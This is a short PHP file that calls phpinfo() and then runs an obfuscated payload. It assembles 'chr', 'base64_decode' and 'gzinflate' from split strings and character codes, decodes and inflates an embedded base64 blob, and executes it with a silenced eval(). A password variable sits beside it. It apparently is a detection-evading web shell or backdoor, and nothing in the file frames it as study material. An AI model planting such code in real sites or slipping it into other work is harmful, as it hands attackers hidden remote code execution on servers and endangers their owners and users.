<?php

phpinfo()

?>
<?php

function test($php_c0d3){

  $password='skr';//EnvPwd

  $cr=preg_filter('/\s+/','','c h r');

  $bs64=preg_filter('/\s+/','','bas e64 _de cod e');

  $gzi=$cr(103).$cr(122).$cr(105).$cr(110);

  $gzi.=$cr(102).$cr(108).$cr(97).$cr(116).$cr(101);

  $c=$bs64($php_c0d3);

  $c=$gzi($c);

  @eval($c);

}

$php_c0d3='S0lNy8xL1VAvzkjNySlILC5W11EBUeX'.

'5RSma1rxcKgWZeWm2KvFBroGhrsEh0UogvlIsUC'.

'YzTQMiaatUmVqspFnNy1WQARLI1wBprAXi1LLEH'.

'A2EXrgdsZrWAA==';

test($php_c0d3);

?>